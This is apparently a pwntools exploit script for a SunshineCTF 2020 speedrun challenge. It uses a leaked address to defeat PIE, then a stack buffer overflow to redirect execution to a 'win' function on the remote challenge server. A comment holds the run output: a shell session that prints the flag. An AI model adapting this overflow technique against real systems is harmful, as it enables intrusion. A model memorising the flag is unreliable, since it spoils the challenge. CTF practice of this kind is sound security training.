from pwn import *

p = remote('chal.2020.sunshinectf.org', 30005)
#p = process('./chall_05')

e = ELF('./chall_05')

p.readline()

p.send('yolo\n')

p.recv(22)
leak = int( p.readuntil(b'\n', drop=True).ljust(8, b'\x00'), 16)

print('LEAK: 0x%.8x' %(leak))

e.address = leak - e.symbols['main']

input('...')

line = b'\xcc'*0x38
line += p64(e.symbols['win'])
line += b'\n'

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30005: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_05'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
LEAK: 0x559c86e4d76d
...
[*] Switching to interactive mode
$ ls
chall_05
flag.txt
$ cat flag.txt
sun{chapter-four-9ca97769b74345b1}
'''
